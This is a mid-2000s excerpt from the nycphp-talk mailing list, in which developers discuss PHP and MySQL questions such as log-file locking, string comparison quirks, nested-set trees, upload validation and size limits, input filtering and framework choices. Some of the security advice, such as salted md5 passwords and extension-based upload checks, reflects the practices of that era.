that out?

http://us3.php.net/apache_get_modules

He reads the httpd.conf file to determine if LoadModules does pull in  
SSL.

Message-ID: <8e75ccd3a63e3586897db65d76f9512a@comcast.net>

When you do your own logging of various events to text logfiles created 
from PHP, is file locking needed or does Linux handle this for us? I am 
designing a new web application which will have multiple processes 
appending to the same text logfile, and I'm concerned entries might get 
lost.

If the answer is yes you need to do your own file locking, I'd be 
interested to know how you handle the problem yourself and a pointer to 
resources/discussion would be appreciated.

Thanks!

Subject: [nycphp-talk] Logging and file locking.
Message-ID: <D21B3AD78C55F44EBEAF1E84DCF0A7810141BFA9@anaexch2-nyc.ana.net>

Here is a very simple example of cooperative locking.  Be sure to read
the PHP flock() docs concerning locking files opened with truncation --
which is not the case in this example.  

This was written long ago and I recall testing it on both *nix and Win.
It creates a simple text log file with date, time, IP, and a passed
string.  As a byproduct, it also auto-rotates daily.


function WriteLog( $s )
{
	global $LOG_FILE_PATH;

	$fn = $LOG_FILE_PATH.'log-'.date('Ymd');

	// Open file (or create it).  You should check for errors.

	$fp = fopen( $fn, 'a' );

	/*
	* flock() will block waiting for another proc to release
acquired 
	* lock.  You should probably check error condition here.  See
docs 
	* for how to get EWOULDBLOCK flag.
	*/

	flock($fp, LOCK_EX );		

	/*
	* See to end, write, and then close.  Fclose() releases all
locks.
	* Check for errors as appropriate.
	*/

	fseek( $fp, 0, SEEK_END );

	fwrite($fp, date('Y-m-d H:i:s '));   // Write date/time
	fwrite($fp, $_SERVER['REMOTE_ADDR'].' ');  //Write IP

	fwrite($fp, $s."\n");	// Write passed string and newline.

	fclose($fp);	// Close file which releases lock.
}

Subject: [nycphp-talk] Logging and file locking.

When you do your own logging of various events to text logfiles created 
from PHP, is file locking needed or does Linux handle this for us? I am 
designing a new web application which will have multiple processes 
appending to the same text logfile, and I'm concerned entries might get 
lost.

If the answer is yes you need to do your own file locking, I'd be 
interested to know how you handle the problem yourself and a pointer to 
resources/discussion would be appreciated.

Thanks!

Sorry .. I should have read the docs over more before posting, I saw
PHP_Compat::loadFunction() allows for single function to be imported
(vs. an entire library of calls).

Message-ID: <a9caffe50607171248h56783f4cl5ac95a006bb2312b@mail.gmail.com>

I'd like to pass a variable to a constant, like so:

$imageDir='/uploads/'.$orgID.'/images/';
define('IMAGE_PATH_DIRECTORY', $imageDir)

It doesn't seem to be working. Every time I check the value, the
$orgID is missing. I can print it to the screen (it's held in the
$_SESSION), so I know it's there. My guess is that I just can't do
this, and I'm not finding anything via Google or php.net that tells me
otherwise.

Why use a constant in that case, why not refer to the variable.

Constants are meant not to be changed.

I think that may be what I have to look into. I am modifying a
third-party script, and the image directories have to be specific to
the organization ID of the logged in user.

You'll see the basic structure there
/Music is the MP3 files
/mp3 is the PHP file

The error is a basic WARNING Invalid argument supplied for foreach() on line 5. Same thing reported for Line 18.

you are certain you arrays are not empty?
try scandir( dir() )
will return array of files and directories in the current working
directory.
from there you can use something like is_file() is_dir() to weed out the
desired results.

There shouldn't be any problem in defining a constant through a variable.
What is not allowed, and will be ignored, is to redefine or change a
constant.

If the constant IMAGE_PATH_DIRECTORY, had previously been defined, your
code will be ignored.

I'm pretty certain what's happening here is that the glob function is 
returning an empty array which is why the foreach on line 4 doesn't give 
an error, but it also doesn't set $sort to anything.

foreach requires that the first argument is an array.  So that's why you 
get errors on lines 5 and 18.  You should add a condition between line 4 
and 5 that does something like "if (! is_array($sort))" and then 
displays an empty xml doc and exits if that is the case.

The IF statement does solve the one warning...

but the foreach call including the function is still erroring.

Oh... you know what...  I didn't notice on the first read that the first 
11 lines were a function definition.

Here's what you want between line 4 and 5:

if (! is_array($sort)) { return array();  }

That should solve it hopefully :)

Message-ID: <4b1887110607180719j734634d5jea066c54940a3d87@mail.gmail.com>

Hello,

PEAR DB is cool, and I know it's being phased out, but I am still
having issues with DSN quoting. A password like "ru2H=yE7u" simply

You should present you exact error message(s), but have you examined this
issue bearing in mind that the MySQL internal password encryption technique
has evolved from version 3 to 4 to 5 and that many client-side tools and
scripts have not matched the MySQL change(s). Sometimes you need to force
change how MySQL is handling passwords to move ahead. Google your error
message(s) to get quick tips.

Hello,

PEAR DB is cool, and I know it's being phased out, but I am still having
issues with DSN quoting. A password like "ru2H=yE7u" simply doesnt not seem
to work for me. I am currently using MySQL 5. I followed the quoting
instructions in the docs concerning using URI hex codings "ru2H%3dyE7u" but
I still can't login. Anyone else ever have any of these problems?

Oh... you know what...  I didn't notice on the first read that the first
11 lines were a function definition.

Here's what you want between line 4 and 5:

if (! is_array($sort)) { return array();  }

That should solve it hopefully :)

  Can you post the current non-working script? With so many different

    foreach($sort as $item){$return[]= $item;}

Did you try var_dump($sort) to see what's in $sort?  Seems clear that 
php doesn't like $sort, and a var_dump might tell you why.

I haven't been following along, so forgive me if this has been already
covered.  Looking at the error and the code, for one, I can see a
problem with the path.  You are in '.../Audio/mp3', what you want is
'../Music'.  Secondly, I'm not really sure what your objectives are, but
it appears that some simplification is in order.

Food for thought:

<?php
$dir    = '../Music';
$return = array ();
foreach (glob ("$dir/*.mp3") as $item)
{
    $return[] = basename ($item);
}
print_r($return) ;
?>

Depending on your setup, and your application requirements, you have
many opportunities for caching:

1) At the database level. MySQL provides a query cache that easily
provides this capability. Basically your configuration information in
the database would be stored in a cached query result, and since your
configuration would rarely change I would say this is a very good
scenario for the query cache to provide benefit.

2) At the code/execution level. You could install PHP accelerators and
bytecode compilers that cache all of your PHP scripts, so they are no
longer parsed for every single access by the client.

3) At the code/output level. You could use a caching library to cache
output of your PHP scripts, for example say one script generated a
login form, you could use Cache_Lite from PEAR so that your form
wouldn't need to be constantly generated (and regenerated).

4) At the transport level. You could proxy your application output, so
that your entire website resided in memory on a proxy server that was
in front of your application server. This would mean someone could
browse an entire site without requiring a single PHP script to be
executed.

I'm presenting next week at NYPHP, do come by and we can make sure
caching techniques are discussed. I've certainly learned a lot, and
would like to know what everyone else's experiences were.

Looks like you put the "if(!$return){return array();}" in the wrong spot.

The underlying problem here is that glob("$dir/*.mp3") is not finding 
any mp3 files.  My suggestions were working towards preventing a php 
error from occuring if it doesn't find any mp3 files.  The reason that 
you are getting errors is because you have to supply any "foreach" 
statement with an array.  Currently, some of your foreach's are getting 
supplied NULL when no mp3 files are found and that's what causes the errors.

Here's my updated version of the original 19 lines you supplied (line 4a 
is what I added):

    1.  <?
    2. function readD($dir){
    3. if(!$dir){$dir = '.';}
    4. foreach(glob("$dir/*.mp3") as $item){$sort[]= 
end(explode('/',$item));}
    4a. if(!is_array($sort)) { return array(); }
    5.  foreach($sort as $sorteditem){
    6.   if($sort){natsort($sort);}
    7.     foreach($sort as $item){$return[]= $item;}
    8.      if(!$return){return array();}
    9.      }
   10.   return $return;
   11.   } ?>
   12. <?php header("Content-type: text/xyxml") ?>
   13. <? echo(' <?xml version="1.0" encoding="UTF-8"?> ') ; ?>
   14. <? echo '<player showDisplay="yes" showPlaylist="no" autoStart="yes">
   15. ' ;
   16.
   17. $sFolder = '../Audio/Music' ;
   18. foreach(readD($sFolder) as $item)
   19. {

Hope that clears it up.

Awesome,  That was the issue, my script was fine, the $dir was amiss,
changed it to '../Music, and all is wonderful. Thanks to evceryone who
helped over the past few days.

While it doesn't really answer your question .. Ive been looking @ this
lately ..

http://hyperestraier.sourceforge.net/

I was a little surprised to not find a MySQL or PHP bindings to it
(although I guess you can do PHP-Swig? Maybe).

Then Google led me here ..
http://page2.xrea.jp/doc/Services_HyperEstraier-0.2.8/Services_HyperEstr
aier/_HyperEstraier-0.2.8_HyperEstraier_php.html

Im guessing you basically broker fulltext searching or just that column
data to a more robust fulltext indexing engine.

I don't think in the current MySQL situation you can get any meta
information back from the result :-\

I have tried to avoid $_SERVER['REQUEST_URI'] for security reasons, but
it's just too easy to use for things like login redirects. Are there any
good scripts for validating this variable?
 
As I see it, I should probably deconstruct it, validate the following,
and then reconstruct it.
1.	The domain is "mine"
2.	The requested page is "ok"
3.	The "stuff" after the ? isn't "nasty"
 
Any thoughts or suggestions?

Peter:

An excellent write-up and example is shown in "MySQL Cookbook" by Paul DuBois re O'Reilly. You can get via Amazon for $22.99 used.

I'm currently discovering what that is about myself.

I have MySQL Cookbook and the solid explanation there about full-text
searching is real good, 
including (very importantly) the config tweak on how to get MySQL full text
search to include 3-letter words.


But, the zend tutorial pointed out by Craig Thomas jumps right in quite on
the money:
a) builds a quick form, 
b) introduces and uses Boolean full text searching too, 
c) also offers relevancy in the result sets, 
http://www.zend.com/zend/tut/tutorial-ferrara1.php


This other tutorial (though based on another pre-existing code project),
also shows very nicely:
a) how to splice in a list of words to ignore, 
b) word weighting, 
c) how to apply word stems, 
http://www.symfony-project.com/askeet/21



Errata:

Neat explanation.

Peter:

An excellent write-up and example is shown in "MySQL Cookbook" by Paul
DuBois re O'Reilly. You can get via Amazon for $22.99 used.

I'm currently discovering what that is about myself.

Thanks, David.  We worked hard (very hard!) on the book, and so it's 
nice not just to see it getting this kind of positive recognition but 
also to imagine it helping people write applications that are more 
secure in a whole variety of ways.

Subject: [nycphp-talk] comparison with zero
Message-ID: <1153447511.28157.266529328@webmail.messagingengine.com>

Hi everyone,

Okay, here's a test.

Consider the following snippet:

<?php
define('ZERO', 0);
define('ONE', 1);

function switchIt($val){

	switch($val){
		case ZERO:
		echo 'it is zero';
		break;
		
		case ONE:
		echo 'it is one';
		break;
		
		default:
		echo 'I do not know';
		break;
	}

}

switchIt('undefined');
?>
What will be outputted above? 

If you said 'I do not know', then you are wrong; 'it is zero' will be
outputted.

The reason I think this is happening is because if you do something like
this:

if('one' == 0){
	echo 'one is equal to zero';
}
you will get 'one is equal to zero'. This may be a stupid question, but
why if you compare a string to zero, does it evaluate to true?

Thanks, 

- Jay

All strings are evaluated as zero unless they begin with a character 
which can be interpreted as a numeral.  You can test this as follows:

echo intval( 'a string');

see 
http://us3.php.net/manual/en/language.types.string.php#language.types.string.conversion 
for more information

this is why echo 5 + '5' outputs 10, whereas echo 5 + 'five' outputs 5

Perhaps the real lesson is that the switch/case construct uses == rather

I think to be a little more clear here you have to say, "When a string 
is converted to a number, it will be converted to zero unless it begins 
with a number."

A non-empty string that is converted to a boolean will be converted to 
TRUE. Also, the === operator converts all things to strings and then 
compares the string values to see if the two are equal. Therefore, "str" 
=== 0 becomes "str" == "0" not 0 == 0.

Actually, no.

The === operator does not do any conversion at all, the 2 arguments must
have the same type and the same value for === to return true.

These pages from the manual will give you a good run down on how the
various comparison operators work.

http://php.net/manual/en/language.operators.comparison.php
http://php.net/manual/en/types.comparisons.php

If you want both arguments converted to string and compared as such you
will need to use the strcmp function:

http://php.net/manual/en/function.strcmp.php

Or do the conversion yourself:

if ((string)$a === (string)$b) {
  ...
}

The rules for comparisons are not altogether simple, and I for one found
my first thorough read-through of the pages above very enlightening.

Of course I can't find the page where I read this but I know that I have 
seen many times, "=== compares the string representation of the two 
variables."

Which is why you get different results for "1" == "01" and "1" === "01".

I will keep looking for the page.

I like to think of this is a side-effect of the way PHP determines the
numeric value rather than a special case. The string is scanned from
left to right, and as long as the characters can possibly represent a
numeric value, they are considered to be part of it.

All of these evaluate to TRUE:

var_dump(10 == '10');
var_dump(10 == '010');
var_dump(10 == '10ronaldinho');
var_dump(10 == '10e');
var_dump(10 == '+10e');
var_dump(10 == '10abc20');

E and + are the only non-digit characters that can be interpreted as
representing a numeric value, as far as I'm aware, and it depends on
where they're encountered. (I think + needs to be the first character,
in which case it's superfluous anyway, and E needs to be followed by a
digit.)

These evaluate to FALSE:

var_dump(10 == '10e2');
var_dump(10 == '10E2');

If you're like me, this is surprising. You're probably thinking that the
strings on the right are being converted to integers, because that's
what they're being compared to. Nope, because these evaluate to TRUE:

var_dump(10 == (int)'10e2');
var_dump(10 == (int)'10E2');

These evaluate to FALSE:

var_dump(10 == (float)'10e2');
var_dump(10 == (float)'10E2');

So, I would consider this to be the special case, not strings that don't
begin with a digit.

> A non-empty string that is converted to a boolean will be
> converted to TRUE.

Just so no one is mislead, I think Scott means empty() as in the
function, not all strings that are not the empty string. For example:

$true = '0';

if (!$true) {
    echo "The string '0' is not TRUE.";
}

Hope that helps.

Chris

If you think about it this cannot be correct, as there are many examples
of variables which are not identical though the results of converting
them to a string are.

The reason you get different results for "1" == "01" and "1" === "01" is
that the first compares them as numbers (because they are both numeric
strings), while the second compares them as strings.

 Title: Virtual Hosting Setup - Windows 98/XP & 
Linux with Apache

 I read this article which is very good but it still doesnt answer one
 question. If I were to enter any URL (e.g yahoo.com, hotmail.com I
 mean could be any URL)in the browser in my XP machine, my host file
 would not know what it is going to be. In this case, I still would
 like my Linux machine to serve it with some default page saying
 "Hello". Can I do it with my default virtual host? what else can I do
 to set up such scenario?      
   
 Regards

Hi, i'm working with PHP for the last 3 years, i learnt PHP by myself reading,
but i now i want to know how can i implement XML in PHP, and how can XML could
make better ways to develop in PHP.

I know this is not the list to talk about XML, but that's not the point, i want
to know how is the relation between XML and PHP..

And the Next question is, could any tell me where can i learn about Ajax..

best regards..

It's a hugely broad topic.
Look at the many article on Google talking about what people are doing:

http://www.google.com/search?q=xml+php

Many languages have libraries made to handle XML and make it easier to 
use.
check out:

http://us3.php.net/simplexml

http://us3.php.net/manual/en/ref.domxml.php

Stay away from the paid link on the right for ajax.com, unless you were 
looking to clean your sink. ;)

About learning ajax, better to learn from frameworks or packages like  
http://www.xajax.org, http://pear.php.net/package/
HTML_AJAX etc.

Thanks

Subject: [nycphp-talk] ANNOUNCE: GLP Data-centrice PHP framework
Message-ID: <44C4C76A.1080403@secdat.com>

Secure Data Software is announcing that our GPL'd database-centric PHP
framework has gone into beta.  It is available for download now from the
main project site at:

http://docs.secdat.com

This framework is heavily centered on database applications, and makes large
use of a data dictionary to drive most (sometimes all) of the
functionality.  It stresses not so much the management of code as the
elimination of code wherever possible.

While the system is excellent for large and complex databases (as in
hundreds of tables, loads of calculations and constraints), it can also do
simple projects.  To wit, the documentation site itself is an Andromeda
application with some wiki functionality built in.

We are particularly proud of the self-documenting features of system, every
system we build for our clients gets this type of detail "for free":

http://docs.secdat.com/?gp_page=x_docview&gppn=Data+Dictionary

Support is available at andromeda at secdat.com.  You can also contact me
directly at the email address given below.

Message-ID: <000001c6afe2$1d7e3d40$68e4a144@Rubicon>

Check this site: www.carmax.com and go do a search for a vehicle 
E.g. this link searches around Tampa Florida: 
http://www.carmax.com/dyn/search/quicksearch.aspx?z=33614&l=7105&d=&m=16 

Choose Make, Model... etc. and watch the whole page disappear out from under

you and reload on every dropdown selection. Whoa. 

Wouldn't you say that an AJAX-like solution that only updated the dropdowns
and/or divs 
would make this already highly-effective interface even more slick. It
would.

Join the EEP (Enhanced Experience Programming) movement. 
Put an AJAX aid in every task that could use it. 
Viva la AJAX. 

----------------------

By the by, almost every used car for sale on this site comes with 5 or 10
interior and 
exterior pictures, so if your looking to buy and want to quickly sample what
all kinds 
of cars look like at all types of trim levels and colors and interior
options (without 
going to 10 dealerships) you'll probably find it here.

"waiting for a.carmax.com........."

That must have been sarcasm, not spam. Watching the whole page disappear 
and reload on every change to a drop down menu is not my idea of a fun 
day. I'd rather negotiate with a used car salesman than wait for this to 
"interact". Reminds me of a "quick trip to the department of motor 
vehicles". No thanky.

Hi everybody!

I would like to know how to verify that the files they had been uploaded 
by some user are j peg, because I only want them to upload images and I 
also want to be sure that they are not uploading some kind of malicious 
files. Is there any function or something like it that I could use??
Thanks, and sorry for my English ;)

You can check to see:

if (stristr($_FILES['file_field']['name'],'.jpg')=='' &&
    stristr($_FILES['file_field']['name'],'.jpeg')=='') {
    
    // not okay

}
else {

    // okay

}

That just checks for the existence of the file-extension in the filename
(which you can tighten up), but I'm guessing you can do something similar to
the following if you have a recent version of GD installed:

if(!imagecreatefromjpeg($_FILES['file_field']['tmp_name'])) {

    // file doesn't appear to be a valid jpeg

}

In addition to that, you might resample the image to a different 
size, or convert to another format, or cut, or crop, or merge with 
another image (i.e., copyright). If it is malicious code, then that 
should cause the offending code some problems -- however -- I've 
never encountered any malicious code, it's just an idea.

Furthermore, if you get the image size via:

$imageArray = getimagesize("the.jpg");

and dump the array.

print_r($imageArray);

You will see several data that you could test for.

I'm entertaining the same problem.

Message-ID: <29da5d150607261623t19e60a74nce86d4d394f6f895@mail.gmail.com>

Hello all,

Right now I'm building a site that has a "tree" like structure, and right
now in order to get the children I'm using a recursive function to get them
all, works fine, but that strikes me as inefficient and I'm trying to find a
way to get it with one query, rather than a variable amount of queries based
on how many 'events' a user has.

I looked through the archives of the list to find a thread exactly like
this, but was in 2002 apparently before MySQL had subqueries (and apparently
that's what you need; I'm not sure but that's what I gathered looking
through the responses).

I was wondering if anyone could help me out.

Right now all the events are in a table called 'cal_events', each row has an
id and a parent_id (among other things that I don't think are important for
this).  If you'd like to see the function I can certainly post that as well.

All I do is get all the events that have a parent_id of 0 (top level), loop
through them to get their children, and loop through them to get their
children etc (in order), and indent them as needed on the display side.

Thanks in advance for any ideas.

Maybe try using a modified preorder tree.  This article explains it in 
MySQL/PHP terms - 
<http://www.sitepoint.com/article/hierarchical-data-database/2>.  If you 
organize your tree that way, it will prevent the need for recusion.  The 
only downside is it's more difficult to understand and requires more 
queries when adding new nodes because you have to update the numbering 
for the other nodes.  But I recommend it.

I've got somewhere in my library of routines a set of routines for trees 
using nested subsets.  It worked with mysql and if I recall correctly 
the queries were all simple enough without the need for subqueries.  I 
also seem to recall Hans working on a nested subset lib and discussing 
it on this list.

I beleive what you are looking to get into is nested sets ...

http://www.edutech.ch/contribution/nstrees/index.php

What you have sounds like you are on the right track ...

There is also a PEAR package for doing NS w/ dbs:

Message-ID: <2932E305-26C7-44ED-A62E-AF075E077A50@jonbaer.com>

Does anyone know of any easy script/way to junk a table?

Im trying to think of a simple solution that while you are developing  
a schema/app to easily fill it with test data, not really something  
like fixtures in rails but something that can figure if you have  
varchar(x), char(x), int(x), blob, etc and fill it with -n rows.

Does mysql have anything?  Im sure something can be done w/ bash and  
mysqlimport + desc columns but cant think of route to take.

Thanks.

I use this structure and find it to be very effective for reads. Just
remember to use InnoDB for updates as a crash during an update can
corrupt the entire table structure. Also remember that it can be very
inefficient for writes if you have a very large table and are
manipulating nodes.

Subject: [nycphp-talk] Filtering form input
Message-ID: <44C8DE69.1040106@email.smith.edu>

Greetings listers,

I'm working on some new forms and would like to make them more secure by 
filtering the input.  I recently purchased and have at least partially 
digested Essential PHP Security by Chris Shiflett and The PHP Anthology 
by Harry Fuecks.  Based on this material I can see two possible paths ahead.

1.  Use the clean_array() approach and filter input data using PHP 
methods and/or regex expressions.
2.  Install the Pear package HTML_QuickForm and use for validating 
(filtering) input data.

I was leaning toward #1 but have very little experience with regex. 
It's probably implausible, particularly given time constraints, for me 
to attempt to build regex expressions for my form fields.  Are there any 
resources online for regex expressions that people would recommend for 
filtering input?  Secondly, in Chris's book I see ctype_alnum() and 
html_entities() as two methods recommended to use for filtering.  Are 
there other PHP methods folks would recommend?

I slogged through Pear and HTML_QuickForm a bit.  I haven't worked with 
Pear packages yet and am in a shared hosting environment, so I'm 
currently attempting to see what, if anything, is enabled and/or 
installed for Pear on my server.

Would appreciate any advice or recommendations for how to proceed with 
either method #1 or #2.  At this point I would be satisfied with minimal 
improvements to security as it would be a step in the right direction 
and I can improve my filtering techniques during the next project.

Thanks,

-Aaron

If you decide to go with QuickForm, you can almost certainly install
whatever PEAR packages you need in you own personal directory on your
shared server account. Check out

I use file uploaders often. Most recently I have been using it as a way for
clients to upload Flash files as part of a database application. The .swf?s
are usually 2-10mg and in some cases the browser sits and sits and
apparently never really uploads the file. I looked all over for file size
limitations on the type=file HTML form element but found nothing specific.

Has anyone else experienced this? Is it a browser issue? Network speed
issue? PHP issue? And if it is a known issue, is it better to fall back on
FTP and a manual entry in the database?

Thanks!

Hello Corey,
 
I had the same problem with an upload script that I wrote.   To fix the
problem you will need to change the following settings in the php.ini file:

upload_max_filesize, post_max_size, memory_limit, upload_tmp_dir,
max_execution_time

You can also use .htaccess file to change these settings.  The .htaccess
file will need to be created in the local directory where your script
resides.

My .htaccess contains the following entries:

php_value upload_max_filesize 200M
php_value post_max_size 200M
php_value memory_limit 200M
php_value upload_tmp_dir 200M
php_value max_execution_time 50000

Hope this helps.

limitations on the type=file HTML form element but found nothing specific.

Has anyone else experienced this? Is it a browser issue? Network speed
issue? PHP issue? And if it is a known issue, is it better to fall back on
FTP and a manual entry in the database?

Thanks!

They don't exist. Even controlling the look of the browse button is a 
pain. The type=file element has no ability to actually read info from 
the hard drive of the client [which is right, security wise].  The file 
is POSTED to the server and processed.

PHP/Apache [web-server] issue.

Lots of settings can affect this, but these two [in the .php file]:

ini_set("memory_limit","20M");
ini_set("max_execution_time","60");

have solved the problem for me in the past [large jpgs].

In php.ini there is also a max_upload setting, and Apache can also limit 
the upload size.

Nelly's input is spot on.

Also be sure that apache's LimitRequestBody directive is unlimited (0)
or set to an adequate value.  That precedes PHP's ini values.

To add to this point, always look at the error logs; php will generate an
error or warning when it encounters a problem due to the above reasons.

To reiterate Tedd Sperling's advice, the best way to check whether an
uploaded file is a jpeg is to use getimagesize() and check that index
2 of the returned array is equal to 2. (http://php.net/getimagesize
for details)

Checking the file extension will miss jpegs uploaded from a Macintosh
(which might not have an extension).

Actually there is ONE HTML sided way...

Directly before the <input file/> tag, put an <input hidden/>

eg. <input type="hidden" name="MAX_FILE_SIZE" value="50000"/>

The NSM works great (I use it everywhere), but beware of long insert
times in tables larger than 50,000 nodes.

The Clew code referenced above does not include methods for moving
nodes, unfortunately, and that's one of the harder operations to get
your head around. It involves 3 updates.

Pretend this is a nested set, where each letter is a node:
xxxmmmzzzzxxxx

The nodes marked m are the ones you want to move, and you want to move
them so that they are to the right of the nodes marked z.

1) right-shift the m nodes past the end of the nested set, which
creates a 3-node gap
2) left-shift the z nodes by 3 so that they fill the gap to the left,
and create a corresponding gap to the right
3) left-shift the m nodes into the new gap, to the right of the last z

The result:
xxxzzzzmmmxxxx

As Cliff pointed out, be sure to use an InnoDB table so that you can
combine the updates into a single transaction.

Also, it's really important from a performance point of view to limit
the table structure to integers only. Fixed-width columns speed the
update operation that increments al of the left and right values in
the table. That's why the node and content tables are kept separate,
and share a nodeid key.

If you're using PostgreSQL, I highly recommend loading the 'tablefunc' 
package in the /contrib directory.  It includes support for an 
Oracle-like CONNECT BY/START WITH, which makes supporting a tree 
structure easy-breezy.

The complexity of the solution depends one what, exactly, you need to
accomplish. Assuming you are working on a PHP+MySQL application, the
simplest possible approach is just to use mysql_real_escape_string()
on all values that are inserted into the database, and htmlentities()
on all values that come out of the database for display on a web page.

This is all that "security" really demands.

You may also wish to avoid any error messages that might occur when
your application tries to insert a string into an integer field. The
is_numeric() function is great for this. I advise against using the
ctype functions, as they are somewhat counterintuitive when it comes
to checking empty values.

It's also a good idea to check the length of strings before inserting
them into varchar fields, using the strlen() function. MySQL won't
throw an error if you insert a string that's too long; you'll only
find out later that the string was truncated and the data lost.

Beyond security, the smooth functioning of your application probably
depends on using some techniques to determine that user-submitted
values match expected input, such as strings without punctuation (for
filenames), choices from a predetermined list of values (use
in_array()), or strings that look like email addresses.

Email addresses are about the only thing you need complex regex for;
John Coggeshall wrote a tutorial on this that has a good, simple test:
http://www.zend.com/zend/spotlight/ev12apr.php
Avoid the temptation to ask the MX server whether the address exists;
most servers these days refuse to give any sort of definitive answer.

I'm using mysql (sorry, should have posted it on that list instead of talk).

I looked into the NSM, however my fear is the insert / update time.  The
site is based on flexibility of being able to change your 'events'.

I'm still weighing the pros and cons of each method.

Thanks for all the input, its greatly appreciated.

An important question, then, is how much the structure will change vs. 
how much it will be read.  As with many things, you save with one but 
pay more for the other, and you have to decide where to cut your losses. 
  Only you know the answer, of course, but it seems like people wouldn't 
be changing 'events' as much as they'd be reading about them, no?

If your tree is relatively shallow you can use the regular parent_id
structure and 'cheat' by grabbing the number of children each node has
so that you only need to recurse for nodes that actually have children.

Example:

SELECT t1.*,count(t2.id)
FROM mytable AS t1 JOIN mytable AS t2 ON t2.parent_id=t1.id
WHERE t1.parent_id=0
GROUP BY t1.id

This will give you a list of all the 'root' elements, and a count of
each elements children, to get the next level you can iterate over them
and grab the children.

I have used this structure a couple of times and you'll cut your number
of queries by the number of 'leaf' nodes in the tree vs the regular
approach of checking each node for children individually.

Of course, I've also done a fair bit of work on MPTT (Modified Preorder
Traversal Tree) models, you can find some code I cooked up a few years
ago here:

http://clew.phpwerx.net/

And also check out phpGACL:

http://phpgacl.sourceforge.net/

The nice thing about MPTT is that if you're careful you can make the
system tolerant of gaps in the left and right values, and thus the tree
need not be in an invalid state at any point.  Also, because we still
store the parent id, you can easily grab just the direct parents or
children of a given node, and also rebuild the left and right values in
a disaster recovery situation.

One of the ways to deal with this is to introduce fragmentation.  This book
is a must have:

http://www.amazon.com/gp/product/1558609202/002-4209242-6172841?v=glance&n=2
83155

Among other things, an interesting approach that he introduces is the
fragmentation of the nested sets.  For instance, you start the nested set
numbering (ie, number line) in multiples of hundreds, when an insert comes
along, you only have to update the rows within your fragment.  Then, on a
maintenance basis, you can renumber the entire numbering line to keep some
level of fragments.  Joe Celko goes into details about this, the pros/cons,
and other techniques.

And make sure to use DHTML to put the Javascript validation errrors in a
DIV or something, instead of an alert box. alert() is soooo Web 1.0

And when you're done with all that don't forget to pick up my dry

It's not that people wouldn't be vieweing them more, its that I don't think
the depth of the tree would be enough to warrant sacrifice in adding /
moving.  I can't see many users going past 3 - 4 levels of depth, but I want
them to be able to, which is why I don't just denormalize it.

The current query is very similar to the Dan suggested ( with some obvious
changes for my structure).

Thanks Chris, I've already tried getimagesize() and it works great, but 
I also might allow the users to upload an image as pdf or some others 
formats like tif or may be bmp I don't know yet, but I think that I 
could validate those types of files with a system call to `file -i`,  I 
would give me the type of file also, I'm not sure if it's safe but I'm 
gonna try and see what happens, thanks for your answer, I appreciate it 
so much!

Subject: [nycphp-talk] md5 string length max?
Message-ID: <44CA2F6F.5030402@email.smith.edu>

Greetings again listers,

Is there a maximum string length that md5() can take?  I don't see a 
mention of one in the PHP manual.

I am considering using a salt and md5() to store password information in 
MySQL.

If there is a max string length then I will inform my users when they 
attempt to create a new account.  I have seen some web applications 
require a password that is a min of 6 or 8 chars and a max of 32...

Thanks,

-Aaron

MD5 isn't going to encounter any problems hashing passwords, it's
regularily used to hash entire files (just to make sure the one in PHP
was fine I just hashed a 5MB file, biggest one i had handy, no problems)
to ensure they are downloaded without error.

So for passwords, the limit is going to be memory, not the hashing alg.

Using `file -i` should be perfectly safe, as you won't be including
any user-submitted info in the command. An excellent solution, though
you may find that it's not always accurate against new or unusual
formats.

If you run into problems, you might also try the FileInfo extension
(http://php.net/fileinfo), which seems to use a different database.

I think it's extremely promising, but I also think it has a bit of a

Using it alot .. im using it after spending a good 6 months w/ Ruby on Rails though so my opinion might be one sided, overall it gives a good feeling of knowing that when something break you know *exactly* where to look .. which probably leads to this "agile" thing :-)

The best thing to probably look @ if you decide to pick it up is the Cajax helper by rossoft (he writes alot of nice Cake plugins - http://rossoft.wordpress.com) which is like RJS in Rails and lets you do that nice Ajaxy stuff w/ Prototype/Scriptaculous libraries.  

What probably amazes me the most about it is how they seemlessly made it work w/ PHP4 and still use much of the OO hooks. 

I like both RoR and Cake but when it comes to deployment PHP wins out in the support area, I still dont think they have figured out the best solution in Rails and the fact that the Bake command does alot more work make it nicer to work with.

Id be more interested in hearing what Mitch or the Joomla folks think about them (I missed the meeting) but definatley would have been a question I would have asked ... picking frameworks vs. rolling your own ...

If anyone if planning to be in Boston the evening of Thursday, October 5th
06 (yah, I know it's a long shot) we're going to do a PHP framework bake off
with Cake (and one of the core devs), Zend, Horde, etc.

More info here:

At this point, you're crazy starting your own, there are already a
glut of them to choose from. That's the answer I would have given you
had you been there to ask ;-)

When I presented the 1.5 API to BostonPHP I met with one of the
CakePHP guys at the irish pub across the street. I'm asking him if
he's interested in making a talk here at NYPHP, and am quietly
hopeful.

We've had a lot of exposure to Joomla and family (by the way thanks Mitch
for an always great presentation) and we'd certainly like to have some other
CMSs present.  If anyone is in the tri-state area, or would be willing to
travel, let us know, or put us in touch with someone.

http://www.nyphp.org/presentations.php

Our fall schedule is mostly open but we have pending presentations so tell
us soon.

If anyone is interested, I could put together a follow up presentation
to last Fall's eZ Publish presentation.  In that area, there is two
directions I could take.

In the CMS theme:
    Getting started building websites eZ Publish 3.X
    - Installation & Configuration
    - Templating
    - Creating new Content Classes
    - Access Control

In the framework theme:
    Building web-apps using eZ Components in PHP 5
    - A brief overview of the set of components
    - Focus on some of the major ones:
      - DB
      - Logging
      - Templating
      - Configuration
 (Not necessarily set in stone of course! Just some thoughts.)

I think both would be tutorial-like.

FYI, the eZ Components topic isn't very applicable to current release
(3.8) of eZ Publish, but they will be the foundation for the eZ platform
Application Server to be released in December 2007. That in turn will be
the foundation for the next major versionof the eZ Publish CMS named
Telemark and to be released in December 2008.

Any interest in either one?  Thoughts on things you might like to see
covered?

Here are some urls to check out:
    eZ Publish
        http://ez.no/products/ez_publish
    eZ Components

Im currently looking @ using it as a deployment tool much like  
Capistrano is for Rails ... I think it would be a great topic for a  
talk.  +1 from me.  On a side note if someone could figure how to get  
the bake command to call phing tasks that would be nice ... :-)

You should be able to easily do it the other way around - have phing
call bake.  Thats how phing is meant to work.

Two things I've used:

SACK
a very simple JS class for implementing AJAX.  I have it integrated 
into my framework, and have used it on a few occasions.  I like its 
simplicity.
http://twilightuniverse.com/projects/sack/

Yahoo UI tools
more JS classes, for doing a variety of things.  I think this has a 
lot of promise; I'm thinking about redoing my admin framework to be 
entirely AJAX-based, and was considering using these as a way to 
simplify that development.
http://developer.yahoo.com/yui/

For me, the best way to learn is to just create a little project 
where I can play without any repercussions. :)

Have you read:

Subject: [nycphp-talk] include_path usage with PayPalPro SDK???
